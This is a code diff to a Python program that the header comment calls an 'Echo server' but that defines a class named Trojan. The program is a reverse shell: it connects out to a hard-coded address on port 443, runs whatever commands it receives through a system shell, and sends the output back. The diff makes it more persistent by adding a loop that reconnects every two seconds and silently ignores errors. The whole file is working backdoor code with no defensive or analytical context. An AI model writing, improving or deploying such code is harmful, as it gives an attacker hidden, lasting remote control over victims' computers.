@@ -1,6 +1,7 @@
 # Echo server program
 import socket
 import subprocess
+import time
 
 
 class Trojan:
@@ -10,9 +11,14 @@ class Trojan:
 
 
     def connect(self):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as con:
-            con.connect((self.ip, self.port))
-            self.listen(con)
+        while True:
+            try:
+                con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                con.connect((self.ip, self.port))
+                self.listen(con)
+            except Exception as e:
+                time.sleep(2)
+
 
     def execute(self, con):
         data = self.command(con)
@@ -25,15 +31,25 @@ class Trojan:
 
 
 
+
     def command(self,  con):
         return con.recv(1024).decode().strip()
 
     def execute_command(self, command):
-        proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-        return proc.stdout.read()
+        if command != "/exit":
+            proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+            return proc.stdout.read()
+        else:
+            return "Waiting..."
+
 
     def print_message(self, con, message):
         con.sendall(message)
+
+
 if __name__ == "__main__":
     trojan = Trojan("192.168.2.101", 443)
     trojan.connect()
+
+
+
